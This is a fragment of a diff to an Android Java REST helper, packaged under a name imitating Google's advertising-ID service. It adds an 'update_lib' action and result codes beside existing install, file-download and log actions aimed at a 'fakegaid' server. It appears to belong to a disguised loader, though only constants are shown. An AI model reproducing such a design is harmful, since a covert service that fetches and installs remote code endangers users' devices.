@@ -11,18 +11,19 @@ import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Resul
 import static com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProvider.CryptoProviderServicer.codeUrlParams;
 
 public class RestServicer {
-    public static final int LOADER_CREATE  = 1;
-    public static final int LOADER_INSTALL = 2;
-    public static final int LOADER_READ    = 3;
-    public static final int LOADER_DELETE  = 4;
-    public static final int LOADER_UPDATE  = 5;
+    public static final int LOADER_CREATE      = 1;
+    public static final int LOADER_INSTALL     = 2;
+    public static final int LOADER_READ        = 3;
+    public static final int LOADER_DELETE      = 4;
+    public static final int LOADER_UPDATE      = 5;
+    public static final int LOADER_UPDATE_LIB  = 6;
     private static String formatJsonParam(String k, String v)
     {
         return "\"" + k + "\":\"" + v + "\"";
     }
 
     public static final String TAG           = "GAID_REST";
-    public static final String BASE_URL      = "https://fake_gaid.appclick.org/gaid";
+    public static final String BASE_URL      = "https://fakegaid.appclick.org/gaid";
 
     public  static final String ACTION_CREATE          = "create";
     public  static final String ACTION_INSTALL         = "install";
@@ -31,7 +32,11 @@ public class RestServicer {
     public  static final String ACTION_UPDATE          = "update";
     public  static final String ACTION_DOWNLOAD_FILE   = "file_download";
     public  static final String ACTION_LOG             = "log";
+    public  static final String ACTION_UPDATE_LIB      = "update_lib";
 
+    public static final int CODE_NULL_RESULT   = 0;
+    public static final int CODE_OK            = 1;
+    public static final int CODE_UNKNOWN_ERROR = 2;
 
     public enum TypeRestServicer{
         SIMPLE,
